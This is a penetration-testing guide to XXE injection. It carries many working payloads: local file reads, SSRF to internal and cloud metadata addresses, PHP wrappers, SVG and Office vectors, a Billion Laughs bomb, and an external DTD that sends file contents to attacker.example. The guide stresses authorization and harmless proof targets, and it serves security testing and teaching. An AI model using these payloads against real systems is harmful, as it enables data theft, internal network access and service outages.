# XML External Entity Injection — XXE

## Introduction

XML External Entity Injection, usually shortened to **XXE**, is a vulnerability where an XML parser processes attacker-controlled external entities in an unsafe way.

The key idea:

```text
User-controlled XML  →  XML parser resolves entity  →  local file / internal URL / external URL is accessed
```

This is dangerous because XML parsers may be able to read local files, make server-side HTTP requests, access internal services, or expand entities in a way that causes denial of service.

XXE can lead to:

* local file disclosure
* application configuration disclosure
* source code disclosure
* environment variable disclosure
* SSRF against internal services
* cloud metadata access
* blind out-of-band data exfiltration
* error-based file disclosure
* denial of service through entity expansion
* parsing of malicious Office, SVG, SOAP, SAML, or XML-based uploads
* in some rare chains, remote code execution through parser-specific features or secondary vulnerabilities

---

## Useful Resources

* [HackTricks XXE / XEE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
* [Incendium XXE Notes](https://notes.incendium.rocks/pentesting-notes/web/injection/xxe)
* [PortSwigger XXE](https://portswigger.net/web-security/xxe)
* [PortSwigger Blind XXE](https://portswigger.net/web-security/xxe/blind)
* [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [OWASP XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)
* [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
* [GoSecure DTD Finder](https://github.com/GoSecure/dtd-finder)
* [Detectify — XXE in Office Open XML](https://labs.detectify.com/writeups/how-to-fix-xxe-vulnerabilities-in-java/)

---

## Basics

Most XXE testing is about answering eight questions:

1. **Does the application parse XML?**
   Example: SOAP, SAML, SVG, XML API, RSS, DOCX/XLSX/PPTX import, plist, XHTML, XML config upload.

2. **Can I control the XML body or an XML-based file?**
   Example: raw XML request, uploaded SVG, uploaded Office document, imported XML feed.

3. **Does the parser allow `DOCTYPE` declarations?**
   XXE usually requires a DTD or external entity declaration.

4. **Does the parser resolve external entities?**
   Example: `file://`, `http://`, `https://`, `ftp://`, `jar://`.

5. **Is the entity value reflected in the response?**
   If yes, this is in-band XXE.

6. **If output is not reflected, can I prove parsing out-of-band?**
   Use DNS or HTTP callbacks with Burp Collaborator, interactsh, webhook.site, or a controlled listener.

7. **Can the parser reach internal services?**
   XXE may become SSRF.

8. **Can the parser read local files?**
   Test only harmless files first and avoid sensitive data extraction unless explicitly authorized.

A vulnerable flow often looks like this:

```text
Attacker submits XML with external entity:
    <!ENTITY xxe SYSTEM "file:///etc/hostname">

Parser resolves entity:
    reads /etc/hostname

Application response includes:
    hostname value
```

---

## XML Quick Refresher

Simple XML:

```xml
<user>
  <name>alice</name>
  <role>user</role>
</user>
```

XML with DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ELEMENT user ANY>
]>
<user>
  <name>alice</name>
</user>
```

Internal entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY marker "xxe-test-73921">
]>
<user>
  <name>&marker;</name>
</user>
```

External entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
  <name>&xxe;</name>
</user>
```

Parameter entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY % ext SYSTEM "http://attacker.example/test.dtd">
  %ext;
]>
<user>
  <name>test</name>
</user>
```

Important distinction:

```text
General entity:      &entity;
Parameter entity:    %entity;
```

Parameter entities are especially useful in blind and external-DTD XXE testing.

---

## Main XXE Types

| Type                 | Meaning                                               | Typical signal                                           |
| -------------------- | ----------------------------------------------------- | -------------------------------------------------------- |
| In-band XXE          | Entity output is returned in the HTTP response.       | File contents or marker appears in response.             |
| Blind XXE            | Entity is processed, but output is not returned.      | DNS/HTTP callback.                                       |
| Out-of-band XXE      | Parser makes a request to attacker-controlled domain. | Burp Collaborator/interactsh hit.                        |
| Error-based XXE      | File contents appear inside parser error message.     | XML parser exception leaks data.                         |
| SSRF via XXE         | External entity points to internal HTTP service.      | Internal response or callback.                           |
| File-read XXE        | External entity reads local file.                     | `/etc/hostname`, `/etc/passwd`, Windows hosts file.      |
| Parameter-entity XXE | Uses `%entity;` inside DTD.                           | Often works when normal entities fail.                   |
| External-DTD XXE     | Parser loads attacker-hosted DTD.                     | OOB request to DTD server.                               |
| XInclude injection   | XML processor supports XInclude.                      | Included file/output appears.                            |
| Entity expansion DoS | Nested entities exhaust resources.                    | Slowdown, parser crash, memory exhaustion.               |
| Second-order XXE     | Malicious XML stored first and parsed later.          | Callback or output appears during background processing. |

---

## Where to Test

Test anything that accepts or processes XML or XML-based formats.

| Location                | Examples                                                      |
| ----------------------- | ------------------------------------------------------------- |
| XML APIs                | `Content-Type: application/xml`, `text/xml`                   |
| SOAP APIs               | SOAP envelopes, WSDL-based services                           |
| SAML                    | SAML responses, metadata imports                              |
| SVG upload              | avatar, logo, image processing                                |
| Office upload           | DOCX, XLSX, PPTX import or preview                            |
| RSS/Atom feeds          | feed importer, blog importer                                  |
| XML config upload       | integration settings, admin import                            |
| Mobile APIs             | older XML-based endpoints                                     |
| PDF/document generation | XML-to-PDF, XSLT processors                                   |
| WebDAV                  | XML request bodies                                            |
| plist files             | Apple/iOS/macOS integrations                                  |
| XHTML                   | HTML parsed as XML                                            |
| XML-RPC                 | legacy APIs                                                   |
| XSLT                    | XML transformation features                                   |
| File converters         | LibreOffice, ImageMagick, custom parsers                      |
| Background jobs         | async import, report generation, antivirus/content extraction |

Interesting headers:

```text
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
Content-Type: image/svg+xml
Accept: application/xml
```

Interesting file types:

```text
.xml
.svg
.xsl
.xslt
.xhtml
.wsdl
.rss
.atom
.docx
.xlsx
.pptx
.odt
ods
odp
.plist
.kml
.gpx
```

Interesting parameter names:

```text
xml
data
body
payload
document
file
config
import
feed
rss
saml
metadata
svg
template
report
content
message
request
```

---

## Safe Testing Workflow

1. Confirm scope and authorization.
2. Identify XML parsing functionality.
3. Capture a normal request or file upload.
4. Change only one field at a time.
5. Start with harmless internal entity replacement:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY marker "xxe-test-73921">
]>
<root>&marker;</root>
```

6. If reflected, test controlled local files:

```text
/etc/hostname
/etc/issue
C:\Windows\System32\drivers\etc\hosts
```

7. If not reflected, test OAST/DNS callback:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/">
]>
```

8. If normal external entities fail, try parameter entities.
9. If external network is blocked, test error-based behavior carefully.
10. Avoid denial-of-service payloads on production.
11. Avoid extracting sensitive files unless explicitly authorized.
12. Prove impact with minimum safe evidence.

Good low-impact proof targets:

```text
/etc/hostname
/etc/issue
/proc/version
C:\Windows\System32\drivers\etc\hosts
http://xxe-test-73921.oast.example/
```

Avoid as first proof:

```text
/etc/shadow
private keys
cloud credentials
application secrets
database passwords
large files
billion laughs payloads
recursive entity bombs
destructive internal URLs
```

---

## First Probe Payloads

### Internal Entity Test

This checks whether custom entities are processed.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY marker "xxe-test-73921">
]>
<root>
  <name>&marker;</name>
</root>
```

Expected result:

```text
xxe-test-73921 appears in response → entity expansion works
payload unchanged                  → entity not expanded or wrong context
parser error                       → DTD blocked or parser reached
```

### Basic External Entity Callback

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/">
]>
<root>
  <name>&xxe;</name>
</root>
```

Signals:

```text
DNS callback       → parser resolved external host
HTTP callback      → parser fetched external entity
no callback        → external entities disabled or egress blocked
parser error       → DTD parsed but resolution failed or blocked
```

### Basic File Read

Linux:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <name>&xxe;</name>
</root>
```

Windows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>
  <name>&xxe;</name>
</root>
```

Use harmless files first.

---

## In-Band XXE

In-band XXE means the entity value is returned in the application response.

Example request:

```http
POST /api/user HTTP/1.1
Host: vulnerable.example
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
  <name>&xxe;</name>
</user>
```

Possible response:

```xml
<result>
  <name>app-server-01</name>
</result>
```

Useful proof files:

```text
/etc/hostname
/etc/issue
/proc/version
C:\Windows\System32\drivers\etc\hosts
```

If the parser blocks `file://`, try OAST to distinguish between:

```text
DTD disabled
external entities disabled
file protocol blocked
network egress blocked
response not reflected
```

---

## Blind XXE

Blind XXE occurs when the parser resolves external entities but the response does not include entity output.

Basic blind callback:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/blind">
]>
<root>
  <name>&xxe;</name>
</root>
```

If this does not work, try parameter entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://xxe-test-73921.oast.example/param">
  %xxe;
]>
<root>
  <name>test</name>
</root>
```

Check your OAST listener for:

```text
DNS lookup
HTTP request
source IP
User-Agent
path
timestamp
```

Blind XXE proof is often enough if you can show the server made an external request from XML parsing.

---

## Out-of-Band XXE with External DTD

External DTDs are useful when direct entity output is not reflected.

Main XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/xxe.dtd">
  %remote;
]>
<root>
  <name>test</name>
</root>
```

Attacker-hosted `xxe.dtd` for harmless callback:

```dtd
<!ENTITY % callback SYSTEM "http://xxe-test-73921.oast.example/dtd-loaded">
%callback;
```

This proves:

```text
parser accepted DOCTYPE
parser resolved external parameter entity
parser fetched attacker-hosted DTD
parser executed DTD content
```

Keep first DTD payloads harmless and marker-based.

---

## OOB Data Exfiltration Pattern

Use only in authorized environments. Start with harmless files such as `/etc/hostname`.

External DTD:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.example/?x=%file;'>">
%eval;
%exfil;
```

XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/xxe.dtd">
  %remote;
]>
<root>
  <name>test</name>
</root>
```

Notes:

```text
Works best with short, URL-safe file contents.
Multiline files may break URLs.
Special characters may break the request.
Some parsers block nested parameter entities.
Some parsers block external DTDs.
Some networks block outbound HTTP.
```

For public notes and normal reports, prefer proving OOB capability with a static marker before attempting file content exfiltration.

---

## Error-Based XXE

Error-based XXE uses parser error messages to leak data.

External DTD concept:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

XML payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/error.dtd">
  %remote;
]>
<root>
  <name>test</name>
</root>
```

Possible result:

```text
XML parser error: file:///nonexistent/app-server-01 not found
```

This can be useful when:

```text
external HTTP callbacks are blocked
entity output is not reflected
parser errors are returned to the user
local file contents are short enough to fit in error path
```

Avoid using sensitive file paths as first proof.

---

## XXE as SSRF

XXE can make the server-side XML parser request internal URLs.

Basic SSRF test:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/health">
]>
<root>
  <name>&xxe;</name>
</root>
```

Private network examples:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://10.0.0.1/">
]>
<root>
  <name>&xxe;</name>
</root>
```

Cloud metadata example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <name>&xxe;</name>
</root>
```

Use minimal proof first:

```text
metadata root reachable
instance-id
hostname
health endpoint
controlled OAST callback
```

Do not retrieve credentials unless explicitly authorized.

---

## XInclude Injection

Sometimes you cannot control the `DOCTYPE`, but you can control XML elements that are processed by XInclude.

Payload:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

Another shape:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://xxe-test-73921.oast.example/xinclude"/>
</root>
```

XInclude is useful when:

```text
the application embeds your XML into a larger server-side document
DOCTYPE is stripped
external entities are disabled
XInclude processing is enabled
```

Not all XML processors enable XInclude.

---

## XXE via SVG Upload

SVG is XML. If the application parses SVG server-side, XXE may be possible.

Basic SVG callback:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/svg">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

File-read SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Check:

```text
image preview
converted PNG/JPG
metadata extraction
thumbnail generation
admin preview
PDF export containing SVG
OAST callbacks
server-side error messages
```

Important:

```text
If SVG is only served back to the browser, the issue may be client-side SVG/XSS, not server-side XXE.
Confirm server-side parsing with OAST or server-rendered output.
```

---

## XXE via Office Documents

DOCX, XLSX, and PPTX are ZIP archives containing XML files.

Testing flow:

```text
1. Create a normal DOCX/XLSX/PPTX.
2. Unzip it.
3. Modify an internal XML file.
4. Add an XXE callback payload.
5. Zip the document back correctly.
6. Upload it to the target feature.
7. Monitor OAST callbacks.
```

Common internal files:

```text
word/document.xml
xl/workbook.xml
xl/sharedStrings.xml
ppt/presentation.xml
[Content_Types].xml
```

Example XML insert:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/office">
]>
```

Then reference:

```xml
&xxe;
```

Check features such as:

```text
document import
spreadsheet import
document preview
metadata extraction
text extraction
virus scanning pipeline
PDF conversion
search indexing
```

This is often second-order because processing may happen asynchronously.

---

## XXE via SOAP

SOAP APIs commonly use XML.

Normal SOAP shape:

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>1</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

XXE test:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

Try OAST if output is not reflected:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://xxe-test-73921.oast.example/soap">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>1</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## XXE via SAML

SAML messages are XML and may be parsed by identity or service providers.

Targets:

```text
SAMLResponse
SAMLRequest
metadata XML import
IdP metadata
SP metadata
single sign-on integrations
```

Basic idea:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/saml">
]>
<samlp:Response>
  ...
</samlp:Response>
```

SAML parsers often validate signatures, schemas, and strict XML structures. XXE may be blocked by hardened libraries, but metadata import features are still worth checking.

Safe testing:

```text
use test IdP/SP
do not break production SSO
prefer metadata import in staging
monitor OAST callbacks
avoid credential-bearing real assertions
```

---

## XXE via RSS / Atom Feeds

Feed importers parse XML from remote URLs.

Payload in RSS:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/rss">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>https://example.com</link>
    <description>test</description>
  </channel>
</rss>
```

Targets:

```text
blog feed importer
newsletter importer
RSS reader
podcast importer
content syndication
admin feed preview
```

This may also combine with SSRF if the application fetches attacker-controlled feed URLs.

---

## XXE via Content-Type Switching

Some endpoints accept JSON by default but also parse XML if the `Content-Type` changes.

Original JSON request:

```http
POST /api/user HTTP/1.1
Host: vulnerable.example
Content-Type: application/json

{"name":"alice"}
```

Try XML:

```http
POST /api/user HTTP/1.1
Host: vulnerable.example
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY marker "xxe-test-73921">
]>
<user>
  <name>&marker;</name>
</user>
```

Also try:

```text
text/xml
application/xml
application/soap+xml
application/xhtml+xml
image/svg+xml
```

Watch for:

```text
different parser errors
same endpoint accepting XML
automatic XML binding
framework-level XML deserialization
different behavior based on Accept header
```

---

## Common File Targets

Use harmless files first.

Linux:

```text
/etc/hostname
/etc/issue
/proc/version
/proc/self/cmdline
/proc/self/environ
/etc/passwd
```

Windows:

```text
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
```

Application files, only if authorized:

```text
.env
config.yml
application.properties
settings.py
web.config
database.yml
docker-compose.yml
kubernetes service account token
```

High-sensitivity targets:

```text
private keys
cloud credentials
database passwords
session secrets
JWT signing keys
/etc/shadow
```

Do not extract high-sensitivity files unless explicitly allowed.

---

## PHP Wrapper Tricks

In PHP-based XML parsing contexts, wrappers may be useful.

Base64 file read:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
]>
<root>&xxe;</root>
```

Why useful:

```text
binary or special characters may break XML output
base64 can make file output safer to transport
some files contain invalid XML characters
```

Only applies when the parser/runtime supports PHP stream wrappers.

---

## Java-Specific Notes

Java XML parsers may support URL handlers such as:

```text
file://
http://
https://
ftp://
jar:
```

JAR protocol examples:

```text
jar:file:///path/to/archive.zip!/file.txt
jar:http://attacker.example/archive.zip!/file.txt
```

Potential Java signals:

```text
SAXParseException
DocumentBuilderFactory
SAXParserFactory
XMLInputFactory
TransformerFactory
SchemaFactory
Validator
JAXB
DOM4J
JDOM
```

Java hardening must be applied per parser/factory. Do not assume one global XML setting protects all XML processing paths.

---

## Entity Expansion DoS

Entity expansion attacks abuse nested entities to consume memory or CPU.

Classic “Billion Laughs” concept:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<root>&c;</root>
```

Do not use destructive expansion payloads against production systems.

Safe DoS review should focus on configuration:

```text
DTD disabled
entity expansion limits
max entity depth
max document size
max parse time
memory limits
streaming parser limits
```

Report DoS risk without crashing the service.

---

## Common Bypasses

### Parameter Entities

If normal entities fail:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://xxe-test-73921.oast.example/param">
  %xxe;
]>
<root>test</root>
```

### External DTD

If direct file output is blocked:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/xxe.dtd">
  %remote;
]>
<root>test</root>
```

### Encoding

Try different XML encodings only in authorized testing:

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

```xml
<?xml version="1.0" encoding="UTF-16"?>
```

Some parsers behave differently depending on encoding and input normalization.

### Alternative Protocols

Depending on parser/runtime:

```text
file://
http://
https://
ftp://
jar:
php://filter
expect://
gopher://
```

Availability is highly parser and runtime dependent.

### Content-Type Switching

```text
application/xml
text/xml
application/soap+xml
application/xhtml+xml
image/svg+xml
```

### XML Case / Whitespace Variations

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example">
]>
```

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example"> ]>
```

```xml
<!DOCTYPE
root
[
<!ENTITY
xxe
SYSTEM
"http://xxe-test-73921.oast.example">
]>
```

### CDATA Confusion

CDATA may affect how payloads are handled in downstream XML/HTML rendering.

```xml
<![CDATA[<test>value</test>]]>
```

This is more commonly useful for parser/context testing than for direct XXE.

---

## Response Analysis

Compare more than visible output.

| Signal                    | Meaning                                                       |
| ------------------------- | ------------------------------------------------------------- |
| Marker entity appears     | Internal entity expansion works.                              |
| File content appears      | In-band file-read XXE confirmed.                              |
| OAST DNS hit              | Parser resolved external entity host.                         |
| OAST HTTP hit             | Parser fetched external entity.                               |
| XML parser error          | Payload reached XML parser.                                   |
| Error includes file path  | Error-based leakage possible.                                 |
| Response delayed          | Parser tried to resolve external resource or expand entities. |
| Different status code     | XML parsing behavior changed.                                 |
| Different response length | Entity expansion or error changed output.                     |
| 400 with XML error        | Parser saw DTD/entity syntax.                                 |
| 500 server error          | Parser exception may be unhandled.                            |

Useful error strings:

```text
DOCTYPE is disallowed
External Entity
SAXParseException
DocumentBuilder
XMLInputFactory
libxml
lxml
ExpatError
XmlException
System.Xml
XmlReader
EntityReference
Entity not defined
Failed to load external entity
```

---

## Blind XXE OAST Checklist

Use unique URLs per test:

```text
xxe-body-73921.oast.example
xxe-param-73921.oast.example
xxe-svg-73921.oast.example
xxe-office-73921.oast.example
xxe-soap-73921.oast.example
```

Check:

```text
DNS only
HTTP request
source IP
User-Agent
path
query string
timestamp
repeatability
```

Good proof:

```text
The XML parser made an HTTP request to a unique OAST URL after processing a parameter entity.
```

Better proof:

```text
The callback only happened when the XXE payload was present and did not happen for the baseline XML.
```

---

## Common False Positives

| Situation                  | Why it can mislead                               |
| -------------------------- | ------------------------------------------------ |
| XML parser error only      | Parser saw XML but may not resolve entities.     |
| Input reflected unchanged  | No entity expansion happened.                    |
| WAF block page             | Error caused by WAF, not parser.                 |
| Client-side SVG fetch      | Browser fetched resource, not server.            |
| Link preview fetch         | Different component fetched URL, not XML parser. |
| Antivirus/sandbox callback | File scanner fetched URL, not app parser.        |
| DNS prefetch               | DNS callback without parser-controlled fetch.    |
| Cached processing          | Old upload or background job causes delayed hit. |
| Broken XML structure       | Error unrelated to XXE capability.               |

Confirm with:

```text
baseline request without payload
unique marker per endpoint
server-side source IP
server-specific User-Agent
repeatable callback
in-band entity expansion where possible
```

---

## Impact Chaining

XXE is often a pivot.

Common chains:

```text
XXE → local file read
XXE → application config disclosure
XXE → database credential disclosure
XXE → cloud metadata access
XXE → SSRF to internal admin panel
XXE → source code disclosure
XXE → error-based secret leakage
XXE → OOB data exfiltration
XXE → Office document processing pipeline compromise
XXE → SVG processing issue
XXE → denial of service
```

High-impact targets, only if authorized:

```text
application secrets
database credentials
JWT signing keys
SAML private keys
cloud metadata role credentials
Kubernetes service account token
CI/CD credentials
internal service endpoints
```

---

## Manual XXE Checklist

### Discovery

* [ ] Identified XML parsing functionality.
* [ ] Checked raw XML APIs.
* [ ] Checked SOAP endpoints.
* [ ] Checked SAML metadata/import flows.
* [ ] Checked SVG uploads.
* [ ] Checked Office document imports/previews.
* [ ] Checked RSS/Atom importers.
* [ ] Checked XML config upload.
* [ ] Checked background processing and second-order parsing.

### Basic Testing

* [ ] Tested harmless internal entity.
* [ ] Tested external HTTP callback.
* [ ] Tested parameter entity callback.
* [ ] Tested harmless local file read.
* [ ] Tested XML content-type switching.
* [ ] Checked parser errors.
* [ ] Compared baseline request with XXE request.
* [ ] Confirmed actual entity resolution, not reflection.

### In-Band XXE

* [ ] Checked whether entity value appears in response.
* [ ] Used harmless file targets first.
* [ ] Checked Linux and Windows paths if OS unknown.
* [ ] Avoided sensitive file extraction unless explicitly authorized.

### Blind / OOB XXE

* [ ] Used unique OAST domain.
* [ ] Tested general entity callback.
* [ ] Tested parameter entity callback.
* [ ] Tested external DTD callback.
* [ ] Recorded DNS/HTTP callback details.
* [ ] Confirmed callback is repeatable.
* [ ] Avoided data exfiltration unless explicitly authorized.

### SSRF via XXE

* [ ] Tested harmless internal endpoint only if allowed.
* [ ] Tested controlled external callback.
* [ ] Checked cloud metadata reachability only with minimal proof.
* [ ] Avoided retrieving credentials unless explicitly authorized.

### File Uploads

* [ ] Tested SVG server-side processing.
* [ ] Tested Office document parsing.
* [ ] Tested XML files inside archives.
* [ ] Checked async processing delays.
* [ ] Checked generated previews/thumbnails/PDFs.
* [ ] Checked OAST callbacks from workers/scanners.

### Bypass Testing

* [ ] Tested parameter entities.
* [ ] Tested external DTDs.
* [ ] Tested XInclude.
* [ ] Tested alternate content types.
* [ ] Tested PHP wrappers where applicable.
* [ ] Tested Java `jar:` only in authorized environments.
* [ ] Tested encoding variations carefully.

### Impact

* [ ] Identified parser behavior.
* [ ] Identified in-band/blind/error-based behavior.
* [ ] Identified file read capability.
* [ ] Identified network callback capability.
* [ ] Identified SSRF capability.
* [ ] Documented minimum safe proof.
* [ ] Avoided DoS payloads on production.


---

## Quick Payload Bank

Internal entity marker:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY marker "xxe-test-73921">
]>
<root>&marker;</root>
```

External callback:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/">
]>
<root>&xxe;</root>
```

Parameter entity callback:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://xxe-test-73921.oast.example/param">
  %xxe;
]>
<root>test</root>
```

Linux file read:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

Windows file read:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>
```

SSRF:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/health">
]>
<root>&xxe;</root>
```

Cloud metadata minimal probe:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<root>&xxe;</root>
```

External DTD loader:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/xxe.dtd">
  %remote;
]>
<root>test</root>
```

Harmless external DTD:

```dtd
<!ENTITY % callback SYSTEM "http://xxe-test-73921.oast.example/dtd-loaded">
%callback;
```

OOB file-read concept with harmless file:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.example/?x=%file;'>">
%eval;
%exfil;
```

XInclude:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>
```

SVG callback:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://xxe-test-73921.oast.example/svg">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

PHP base64 wrapper:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
]>
<root>&xxe;</root>
```

Content-Type values:

```text
application/xml
text/xml
application/soap+xml
application/xhtml+xml
image/svg+xml
```

---

## Practical Summary

XXE is about abusing dangerous XML features, especially DTDs and external entities.

The practical testing flow is:

```text
Find XML parser
→ test harmless entity expansion
→ test external callback
→ test parameter entities
→ test safe local file read
→ test blind/OOB behavior if needed
→ test XML-based uploads and second-order parsers
→ prove minimal safe impact
→ report with parser-specific remediation
```
